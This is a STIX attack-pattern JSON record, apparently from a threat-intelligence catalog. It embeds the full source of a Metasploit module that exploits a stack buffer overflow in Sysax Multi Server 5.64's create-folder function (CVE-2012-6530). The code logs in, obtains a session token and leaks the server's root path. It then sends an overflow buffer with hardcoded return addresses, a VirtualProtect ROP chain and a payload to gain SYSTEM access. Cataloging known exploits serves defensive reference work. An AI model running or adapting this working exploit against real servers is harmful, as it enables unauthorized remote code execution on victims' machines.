{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--167d761c-9c76-4af9-856e-02c1f2720bfe",
    "created": "2024-08-14T16:55:06.579371Z",
    "modified": "2024-08-14T16:55:06.579375Z",
    "name": "Sysax Multi Server 5.64 Create Folder Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the create folder function in Sysax Multi Server 5.64. This issue was fixed in 5.66. In order to trigger the vulnerability valid credentials with the create folder permission must be provided. The HTTP option must be enabled on Sysax too.  This module will log into the server, get a SID token, find the root folder, and then proceed to exploit the server. Successful exploits result in SYSTEM access. This exploit works on XP SP3, and Server 2003 SP1-SP2.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sysax_create_folder.rb",
            "external_id": "sysax_create_folder.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6530"
        },
        {
            "source_name": "reference",
            "url": "http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.mattandreko.com/2012/07/sysax-564-http-remote-buffer-overflow.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Sysax Multi Server 5.64 Create Folder Buffer Overflow',\n      'Description'\t=> %q{\n          This module exploits a stack buffer overflow in the create folder function in\n        Sysax Multi Server 5.64. This issue was fixed in 5.66. In order to trigger the\n        vulnerability valid credentials with the create folder permission must be provided.\n        The HTTP option must be enabled on Sysax too.\n\n        This module will log into the server, get a SID token, find the root folder, and\n        then proceed to exploit the server. Successful exploits result in SYSTEM access.\n        This exploit works on XP SP3, and Server 2003 SP1-SP2.\n      },\n      'License'\t=> MSF_LICENSE,\n      'Author'\t=>\n        [\n          'Craig Freyman',         #Original discovery for the overflow\n          'Matt \"hostess\" Andreko' #More reliable attack vector\n        ],\n      'References'\t=>\n        [\n          [ 'CVE', '2012-6530' ],\n          [ 'OSVDB', '82329' ],\n          [ 'EDB', '20676' ],\n          [ 'EDB', '18420' ],\n          [ 'URL', 'http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html' ],\n          [ 'URL', 'http://www.mattandreko.com/2012/07/sysax-564-http-remote-buffer-overflow.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'\t=> 'win',\n      'Payload'\t=>\n        {\n          'BadChars'\t\t=> \"\\x00\\x2F\\x0d\\x0a\", # 0d and 0a are only bad, due to the Rex::MIME replacing 0d with 0d0a in the message#to_s\n          'Space'\t\t\t=> '1299',\n          'DisableNops'\t=> true,\n        },\n\n      'Targets'\t\t=>\n        [\n          [ 'Windows XP SP3 / Sysax Multi Server 5.64',\n            {\n              'Rop'\t\t=>\t false,\n              'Ret'\t\t=>\t 0x77c35459, # push esp #  ret [msvcrt.dll]\n              'Offset'\t=>\t  711,\n            }\n          ],\n          [ 'Windows 2003 SP1-SP2 / Sysax Multi Server 5.64',\n            {\n              'Rop'\t\t=>\t true,\n              'Ret'\t\t=>\t 0x77baf605, # pop esi; pop ebp; retn 0c; [msvcrt.dll] (pivot)\n              'Offset'\t=>\t 711,\n              'Nop'\t\t=>\t 0x77bd7d82, # RETN (ROP NOP) [msvcrt.dll]\n            }\n          ],\n        ],\n      'Privileged'\t=> true,\n      'DisclosureDate'=> '2012-07-29',\n      'DefaultTarget' => 0))\n\n    register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The URI path to the Sysax web application', '/']),\n          Opt::RPORT(80),\n          OptString.new('SysaxUSER', [ true, \"Username\" ]),\n          OptString.new('SysaxPASS', [ true, \"Password\" ])\n        ])\n\n  end\n\n  def create_rop_chain()\n    rop_gadgets = []\n\n    # ROP chains provided by Corelan.be\n    # https://www.corelan.be/index.php/security/corelan-ropdb/#msvcrtdll_8211_v7037903959_Windows_2003_SP1_SP2\n    if (target == targets[1]) # Windows 2003\n      rop_gadgets =\n      [\n        0x77be3adb, # POP EAX # RETN [msvcrt.dll]\n        0x77ba1114, # ptr to &VirtualProtect() [IAT msvcrt.dll]\n        0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN [msvcrt.dll]\n        0x41414141, # Filler (compensate)\n        0x77bb0c86, # XCHG EAX,ESI # RETN [msvcrt.dll]\n        0x77bdb896, # POP EBP # RETN [msvcrt.dll]\n        0x77be2265, # & push esp #\tret\t [msvcrt.dll]\n        0x77bdeebf, # POP EAX # RETN [msvcrt.dll]\n        0x2cfe0668, # put delta into eax (-> put 0x00000201 into ebx)\n        0x77bdfb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]\n        0x77bdfe37, # ADD EBX,EAX # OR EAX,3000000 # RETN [msvcrt.dll]\n        0x77bdf0da, # POP EAX # RETN [msvcrt.dll]\n        0x2cfe04a7, # put delta into eax (-> put 0x00000040 into edx)\n        0x77bdfb80, # ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]\n        0x77bb8285, # XCHG EAX,EDX # RETN [msvcrt.dll]\n        0x77bcc2ee, # POP ECX # RETN [msvcrt.dll]\n        0x77befbb4, # &Writable location [msvcrt.dll]\n        0x77bbf75e, # POP EDI # RETN [msvcrt.dll]\n        0x77bd7d82, # RETN (ROP NOP) [msvcrt.dll]\n        0x77bdf0da, # POP EAX # RETN [msvcrt.dll]\n        0x90909090, # nop\n        0x77be6591, # PUSHAD # ADD AL,0EF # RETN [msvcrt.dll]\n      ].flatten.pack(\"V*\")\n    end\n\n    return rop_gadgets\n\n  end\n\n  def get_sid\n\n    user = datastore['SysaxUSER']\n    pass = datastore['SysaxPASS']\n\n    creds = \"fd=#{Rex::Text.encode_base64(user+\"\\x0a\"+pass)}\"\n    uri = target_uri.path\n    # Login to get SID value\n    r = send_request_cgi({\n      'method' => \"POST\",\n      'uri'    => normalize_uri(\"#{uri}/scgi?sid=0&pid=dologin\"),\n      'data'   => creds\n    })\n\n    # Parse response for SID token\n    sid = r.body.match(/sid=([A-Z0-9a-z]{40})/)[1]\n    print_status \"SID: #{sid.to_s}\"\n\n    sid.to_s\n\n  end\n\n  def get_root_path(sid)\n\n    # Find the path because it's used to help calculate the offset\n    random_folder_name = rand_text_alpha(8) # This folder should not exist in the root dir\n    uri = normalize_uri(target_uri.path)\n    r = send_request_cgi({\n      'uri' => normalize_uri(\"#{uri}/scgi?sid=#{sid}&pid=transferpage2_name1_#{random_folder_name}.htm\"),\n      'method' => 'POST',\n    })\n\n    # Example message: invalid path: C:\\Documents and Settings\\Administrator\\Desktop\\9dk2hdh2.\n    # Root Path should be C:\\Documents and Settings\\Administrator\\Desktop  (no trailing slash)\n    root_path = r.body.match(/^invalid path: (.*)\\\\#{random_folder_name}\\.$/)[1]\n    print_status \"Root Dir: #{root_path}\"\n\n    root_path\n\n  end\n\n  def exploit\n\n    connect\n\n    sid = get_sid\n    root_path = get_root_path(sid)\n\n    buffer = rand_text(target['Offset']-root_path.length)\n    buffer << [target.ret].pack('V')\n\n    if (target['Rop'])\n      buffer << [target['Nop']].pack('V')*16\n      buffer << create_rop_chain()\n    end\n\n    buffer << make_nops(15)\n    buffer << payload.encoded\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(buffer, nil, nil, \"form-data; name=\\\"e2\\\"\")\n    post_data.bound = rand_text_numeric(57) # example; \"---------------------------12816808881949705206242427669\"\n    uri = normalize_uri(target_uri.path)\n    r = send_request_cgi({\n      'uri'\t  => normalize_uri(\"#{uri}/scgi?sid=#{sid}&pid=mk_folder2_name1.htm\"),\n      'method'  => 'POST',\n      'data'\t  => post_data.to_s,\n      'ctype'\t  => \"multipart/form-data; boundary=#{post_data.bound}\",\n    })\n\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-29",
    "x_mitre_platforms": [
        "win'"
    ]
}